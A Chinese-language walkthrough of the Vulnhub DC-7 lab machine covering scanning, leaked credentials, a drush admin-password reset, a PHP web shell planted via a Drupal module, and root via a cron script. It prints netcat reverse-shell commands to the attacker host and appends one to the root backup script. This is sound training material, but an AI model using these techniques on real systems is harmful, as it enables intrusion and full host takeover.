---
title: Vulnhub-DC-7
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-7

> https://www.vulnhub.com/entry/dc-7,356/
> 

## 端口扫描主机发现

1. 探测存活主机，`178`是靶机
    
    ```php
    nmap -sP 192.168.75.0/24                 
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:30 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00037s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00030s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.178
    Host is up (0.00049s latency).
    MAC Address: 00:0C:29:31:46:A0 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00037s latency).
    MAC Address: 00:50:56:FE:CA:7A (VMware)
    Nmap scan report for 192.168.75.151
    ```
    
2. 探测主机所有开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.178
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:31 CST
    Nmap scan report for 192.168.75.178
    Host is up (0.00040s latency).
    Not shown: 65533 closed tcp ports (conn-refused)
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    MAC Address: 00:0C:29:31:46:A0 (VMware)
    ```
    
3. 探测服务版本以及系统版本
    
    ```php
    nmap -sV -sT -O -p80,22 192.168.75.178     
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:32 CST
    Nmap scan report for 192.168.75.178
    Host is up (0.00049s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
    80/tcp open  http    Apache httpd 2.4.25 ((Debian))
    MAC Address: 00:0C:29:31:46:A0 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```c
    nmap -script=vuln -p 80,22 192.168.75.178
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-03 13:33 CST
    Nmap scan report for 192.168.75.178
    Host is up (0.00073s latency).
    
    PORT   STATE SERVICE
    22/tcp open  ssh
    80/tcp open  http
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.178
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.178:80/
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: user-login-form
    |     Form action: /user/login
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: user-login-form
    |     Form action: /user/login
    |     
    |     Path: http://192.168.75.178:80/user/login
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/user/password
    |     Form id: user-pass
    |     Form action: /user/password
    |     
    |     Path: http://192.168.75.178:80/user/password
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node/help
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node
    |     Form id: search-block-form
    |     Form action: /search/node
    |     
    |     Path: http://192.168.75.178:80/search/node/
    |     Form id: search-form
    |     Form action: /search/node/
    |     
    |     Path: http://192.168.75.178:80/search/node/
    |     Form id: search-block-form
    |_    Form action: /search/node
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /rss.xml: RSS or Atom feed
    |   /robots.txt: Robots file
    |   /INSTALL.txt: Drupal file
    |   /: Drupal version 8 
    |_  /README.txt: Interesting, a readme.
    ```
    

## web渗透

1. 访问页面，发现是 `Drupal`CMS
    
    ![image.png](image%2036.png)
    
    ```python
    
    Welcome to DC-7
    DC-7 introduces some "new" concepts, but I'll leave you to figure out what they are.  :-)
    While this challenge isn't all that technical, if you need to resort to brute forcing or a dictionary attacks, you probably won't succeed.
    What you will have to do, is to think "outside" the box.
    Way "outside" the box.  :-)
    @DC7USER
    ```
    
2. 爆破目录看看，好像没有什么实质性的东西
    
    ```python
    dirsearch -u 192.168.75.178 -x 403,404
    //
    [13:53:16] Starting:                                                                                                                                                                                             
    [13:55:54] 301 -  315B  - /core  ->  http://192.168.75.178/core/            
    [13:56:39] 301 -  340B  - /forum/install/install.php  ->  http://192.168.75.178/forum/install/core/install.php
    [13:57:02] 200 -    3KB - /index.php                                        
    [13:57:06] 301 -  326B  - /install.php  ->  http://192.168.75.178/core/install.php
    [13:57:06] 301 -  342B  - /install.php?profile=default  ->  http://192.168.75.178/core/install.php?profile=default
    [13:57:07] 200 -  104B  - /INSTALL.txt                                      
    [13:57:23] 200 -    7KB - /LICENSE.txt                                      
    [13:57:52] 301 -  318B  - /modules  ->  http://192.168.75.178/modules/      
    [13:58:03] 200 -    3KB - /node                                             
    [13:58:04] 406 -   68B  - /node/1?_format=hal_json                          
    [13:58:40] 301 -  319B  - /profiles  ->  http://192.168.75.178/profiles/    
    [13:58:48] 200 -    2KB - /README.txt                                       
    [13:58:55] 200 -  584B  - /robots.txt                                       
    [13:59:00] 302 -  376B  - /search  ->  http://192.168.75.178/search/node    
    [13:59:00] 302 -  376B  - /Search  ->  http://192.168.75.178/search/node    
    [13:59:15] 301 -  316B  - /sites  ->  http://192.168.75.178/sites/          
    [13:59:16] 200 -  309B  - /sites/README.txt                                 
    [13:59:44] 301 -  317B  - /themes  ->  http://192.168.75.178/themes/        
    [13:59:57] 302 -  372B  - /user/  ->  http://192.168.75.178/user/login      
    [13:59:57] 302 -  372B  - /user  ->  http://192.168.75.178/user/login
    [13:59:59] 200 -    3KB - /user/login/                                      
    [14:00:19] 200 -    4KB - /web.config                                       
    [14:00:26] 301 -  335B  - /wp-admin/install.php  ->  http://192.168.75.178/wp-admin/core/install.php
    ```
    
3. 把目录翻了半天没找到可利用的，在`github`找了针对于`drupal`的工具尝试
    
    [https://github.com/immunIT/drupwn](https://github.com/immunIT/drupwn)
    
    ```python
            ____
           / __ \_______  ______ _      ______
          / / / / ___/ / / / __ \ | /| / / __ \
         / /_/ / /  / /_/ / /_/ / |/ |/ / / / /
        /_____/_/   \__,_/ .___/|__/|__/_/ /_/
                         /_/    
    [-] Version not specified, trying to identify it
    [+] Version detected: 8.0                                                                                                                                                                                        
    ============ Users ============
    [+]***** (id=1)
    [+]***** (id=2)
    ============ Default files ============
    [+] /README.txt (200)
    [+] /LICENSE.txt (200)
    [+] /robots.txt (200)
    [+] /web.config (200)
    [+] /update.php (403)
    [+] /install.php (200)
    ============ Nodes ============
    http://192.168.75.178/node/1
    http://192.168.75.178/node/3
    http://192.168.75.178/node/2
    ```
    
    结果也没啥用就是了
    
4. 尝试弱口令，错误次数过多会被封禁
    
    ```python
    Too many failed login attempts from your IP address. This IP address is temporarily blocked. Try again later or request a new password. 
    ```
    
5. 想起作者说的话，虽然它是`早期 DC 版本`（我不会告诉你哪一个）的一种逻辑进展，但其中涉及一些新概念，但你需要自己弄清楚。:-) 如果你需要诉诸暴力破解或字典攻击，你可能不会成功
    
    （而后我们尝试了暴力破解..）
    
    早期DC版本，`DC-1`也是`Drupal`但是版本都不一样，漏洞估计也被修复了
    
    没想法
    
6. 看了下dalao们的WP，发现转折点在，页面底下的**`@DC7USER`** ，我们在GitHub搜索能搜索到
    
    [https://github.com/Dc7User/staffdb](https://github.com/Dc7User/staffdb)
    
    是DC7的一些代码，下面还说
    
    ```python
    This is some "code" (yes, it's not the greatest code, but that wasn't the point) for the DC-7 challenge.
    
    This isn't a flag, btw, but if you have made it here, well done anyway. :-)
    ```
    
    不按套路出牌属实是。。。我们查看下数据库配置文件`config.php` ，获得数据库账号密码
    
    ```python
    <?php
    	$servername = "localhost";
    	$username = "dc7user";
    	$password = "MdR3xOgB7#dW";
    	$dbname = "Staff";
    	$conn = mysqli_connect($servername, $username, $password, $dbname);
    ?>
    ```
    
    尝试后发现`ssh`可以登陆上去
    

## 提权

1. 查看权限
    
    ```python
    dc7user@dc-7:~$ whoami
    dc7user
    dc7user@dc-7:~$ id
    uid=1000(dc7user) gid=1000(dc7user) groups=1000(dc7user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
    dc7user@dc-7:~$ uname -a
    Linux dc-7 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u5 (2019-08-11) x86_64 GNU/Linux
    ```
    
2. 查找敏感文件
    - 在当前`home`目录下存在`mbox`文件，内容好像还是定期备份之类的
        
        ```python
        From root@dc-7 Fri Aug 30 03:15:17 2019
        Return-path: <root@dc-7>
        Envelope-to: root@dc-7
        Delivery-date: Fri, 30 Aug 2019 03:15:17 +1000
        Received: from root by dc-7 with local (Exim 4.89)
         (envelope-from <root@dc-7>)
         id 1i3O0y-0000Ed-To
         for root@dc-7; Fri, 30 Aug 2019 03:15:17 +1000
        From: root@dc-7 (Cron Daemon)
        To: root@dc-7
        Subject: Cron <root@dc-7> /opt/scripts/backups.sh
        MIME-Version: 1.0
        Content-Type: text/plain; charset=UTF-8
        Content-Transfer-Encoding: 8bit
        X-Cron-Env: <PATH=/bin:/usr/bin:/usr/local/bin:/sbin:/usr/sbin>
        X-Cron-Env: <SHELL=/bin/sh>
        X-Cron-Env: <HOME=/root>
        X-Cron-Env: <LOGNAME=root>
        Message-Id: <E1i3O0y-0000Ed-To@dc-7>
        Date: Fri, 30 Aug 2019 03:15:17 +1000
        
        rm: cannot remove '/home/dc7user/backups/*': No such file or directory
        Database dump saved to /home/dc7user/backups/website.sql               [success]
        ```
        
        可以知道脚本在`/opt/scripts/backups.sh` 
        
    - 并且当前目录下存在backups文件夹，里面是`website.sql .GPG` ，`website.tar.gz.gpg`（GPG是加密文件）
3. 查看`/opt/scripts/backups.sh` 文件
    
    ```python
    #!/bin/bash
    rm /home/dc7user/backups/*
    cd /var/www/html/
    drush sql-dump --result-file=/home/dc7user/backups/website.sql
    cd ..
    tar -czf /home/dc7user/backups/website.tar.gz html/
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
    chown dc7user:dc7user /home/dc7user/backups/*
    rm /home/dc7user/backups/website.sql
    rm /home/dc7user/backups/website.tar.gz
    ```
    
    ```python
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql 
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz
    ```
    
    **`--pinentry-mode loopback`**：指定 GPG 使用命令行模式获取密码，而不是弹出窗口
    
    **`--passphrase PickYourOwnPassword`**：在此处直接提供密码（`PickYourOwnPassword`）
    
    **`--symmetric`**：表示使用对称加密方法
    
    是进行对称加密，并且直接给出了密码`PickYourOwnPassword`
    
4. 尝试解密，文件夹内两个文件都解密
    
    ```python
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg
    gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.tar.gz --decrypt /home/dc7user/backups/website.tar.gz.gpg
    ```
    
    同样让 GPG 从命令行读取密码，使用加密时使用的密码，破解成功，并且收到一封邮件
    
    ```python
    dc7user@dc-7:/opt/scripts$ gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --output /home/dc7user/backups/website.sql --decrypt /home/dc7user/backups/website.sql.gpg
    gpg: AES256 encrypted data
    gpg: encrypted with 1 passphrase
    
    You have new mail in /var/mail/dc7user
    ```
    
5. 我们先查看破解出来的文件，内容太多应该没用，返回去看邮件，像是之前`mbox`里的内容，然后再查看`website.tar.gz` ，解密后发现是整个`HTML` 的文件
    
    查看数据库配置文件`settings.php` ,其实在`/var/www`里面也能看（搞这么麻烦感觉走错路了）
    
    ```python
      'username' => 'db7user',
      'password' => 'yNv3Po00',
    ```
    
6. 登录数据库成功，查询有用的数据
    
    ```python
    MariaDB [d7db]> select * from users;
    +-----+--------------------------------------+----------+
    | uid | uuid                                 | langcode |
    +-----+--------------------------------------+----------+
    |   0 | e813638d-3eb3-4212-af40-171dd51023e9 | en       |
    |   1 | fd93872d-a854-44cd-bb08-eb9a11e46492 | en       |
    |   2 | 68803de9-fc7b-4b7b-bce8-d04f11ac4c8a | en       |
    +-----+--------------------------------------+----------+
    //
    MariaDB [d7db]> select * from users_field_data;
    +-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
    | uid | langcode | preferred_langcode | preferred_admin_langcode | name    | pass                                                    | mail              | timezone            | status | created    | changed    | access     | login      | init              | default_langcode |
    +-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
    |   0 | en       | en                 | NULL                     |         | NULL                                                    | NULL              |                     |      0 | 1567054076 | 1567054076 |          0 |          0 | NULL              |                1 |
    |   1 | en       | en                 | NULL                     | admin   | $S$Ead.KmIcT/yfKC.1H53aDPJasaD7o.ioEGiaPy1lLyXXAJC/Qi4F | admin@example.com | Australia/Melbourne |      1 | 1567054076 | 1567054076 | 1567098850 | 1567098643 | admin@example.com |                1 |
    |   2 | en       | en                 | en                       | dc7user | $S$EKe0kuKQvFhgFnEYMpq.mRtbl/TQ5FmEjCDxbu0HIHaO0/U.YFjI | dc7user@blah.com  | Australia/Brisbane  |      1 | 1567057938 | 1567057938 |          0 |          0 | dc7user@blah.com  |                1 |
    +-----+----------+--------------------+--------------------------+---------+---------------------------------------------------------+-------------------+---------------------+--------+------------+------------+------------+------------+-------------------+------------------+
    ```
    
    尝试将`users_field_data` 表的数据放到`john`爆破，没破解出来，寻找别的线索
    
7. 仔细观察`backups.sh` 里面使用了`drush` 命令去读取数据库
    
    ```python
    # 帮助信息
    dc7user@dc-7:/opt/scripts$ drush -h
    Drush provides an extensive help system that describes both drush commands and topics of general interest.  Use `drush help --filter` to present a list of command categories to view, and `drush topic` for a
    list of topics that go more in-depth on how to use and extend drush.
    
    Examples:
     drush                                     List all commands.                                     
     drush --filter=devel_generate             Show only commands defined in devel_generate.drush.inc 
     drush help pm-download                    Show help for one command.                             
     drush help dl                             Show help for one command using an alias.              
     drush help --format=html                  Show an HTML page detailing all available commands.    
     drush help --format=json                  All available comamnds, in a machine parseable format.
    
    Arguments:
     command                                   A command name, or command alias.
    
    Options:
     --field-labels                            Add field labels before first line of data. Default is on; use --no-field-labels to disable.                               
     --fields=<name, description>              Fields to output. All available fields are: name, description.                                                             
     --filter=[category]                       Restrict command list to those commands defined in the specified file. Omit value to choose from a list of names.          
     --format=<json>                           Select output format. Available: table, csv, html, json, list, var_export, yaml. Default is table.                         
     --sort                                    Sort commands in alphabetical order. Drush waits for full bootstrap before printing any commands when this option is used.
    
    Topics:
     docs-readme                               README.md                                    
     docs-output-formats                       Output formatting options selection and use.
    ```
    
    查看一下文档 ：https://drupalchina.gitbooks.io/begining-drupal8-cn/content/chapters/chapter-15.html
    
    找到 ： `user-password` 为具有指定名称的用户账户设置或重置密码
    
    可以修改用户密码，可以尝试修改`admin`用户的密码
    
    ```python
     drush user-password USERNAME --password="SOMEPASSWORD"
    ```
    
    修改成功，修改前记得切换目录到`Drupal`
    
    ```python
    dc7user@dc-7:/var/www/html$ drush user-password admin --password="123456"
    Changed password for admin  
    ```
    

## 后台getshell

1. 登陆后台，寻找可利用的点
    
    ![image.png](image%2037.png)
    
2. 本来想直接修改**`Welcome to DC-7`** 的内容为一句话木马，但是发现没有解析，百度后知道`Drupal`为了安全将`PHP`独立为了一个模块，下面是模块链接🔗
    
    https://www.drupal.org/project/php
    
3. 然后在`Extend`安装该拓展，前提是`Update Manager`安装了
    - 检查`Update Manager` 是否安装了
        
        ![image.png](image%2038.png)
        
    - 然后`Extend` 安装下载的拓展
        
        安装后选择 开启该模块
        
        ![image.png](image%2039.png)
        
        ![image.png](image%2040.png)
        
4. 安装完后，我们来到 `Content` 选项，选择**`Welcome to DC-7`** edit编辑
    
    ![image.png](image%2041.png)
    
    内容改为一句木马，然后内容格式化改为`php` ，然后保存
    
5. 保存后复制页面链接使用蚁🗡连接，然后使用蚁🗡反弹`shell`
    
    ```python
    (www-data:/var/www/html) $ nc 192.168.75.151 1234 -e /bin/bash
    ```
    
    获得`www-data`的`shell`
    
    ```python
    whoami
    www-data
    ```
    
6. 我们知道`backups.sh`脚本属主为`root`，属组为`www-data` ，回到`backups.sh`的目录，将反弹`shell`语句插入脚本
    
    ```python
    echo "nc 192.168.75.151 1233 -e /bin/bash" >> backups.sh
    ```
    
    插入后等待任务自动执行，就能获得`root`的权限了
    
    ```python
    nc -lvp 1233
    listening on [any] 1233 ...
    
    id
    192.168.75.178: inverse host lookup failed: Unknown host
    connect to [192.168.75.151] from (UNKNOWN) [192.168.75.178] 54920
    uid=0(root) gid=0(root) groups=0(root)
    ```
    
7. 读取`flag`文件
    
    ```python
    # cat theflag.txt
    
    888       888          888 888      8888888b.                             888 888 888 888 
    888   o   888          888 888      888  "Y88b                            888 888 888 888 
    888  d8b  888          888 888      888    888                            888 888 888 888 
    888 d888b 888  .d88b.  888 888      888    888  .d88b.  88888b.   .d88b.  888 888 888 888 
    888d88888b888 d8P  Y8b 888 888      888    888 d88""88b 888 "88b d8P  Y8b 888 888 888 888 
    88888P Y88888 88888888 888 888      888    888 888  888 888  888 88888888 Y8P Y8P Y8P Y8P 
    8888P   Y8888 Y8b.     888 888      888  .d88P Y88..88P 888  888 Y8b.      "   "   "   "  
    888P     Y888  "Y8888  888 888      8888888P"   "Y88P"  888  888  "Y8888  888 888 888 888 
    
    Congratulations!!!
    
    Hope you enjoyed DC-7.  Just wanted to send a big thanks out there to all those
    who have provided feedback, and all those who have taken the time to complete these little
    challenges.
    
    I'm sending out an especially big thanks to:
    
    @4nqr34z
    @D4mianWayne
    @0xmzfr
    @theart42
    
    If you enjoyed this CTF, send me a tweet via @DCAU7.
    ```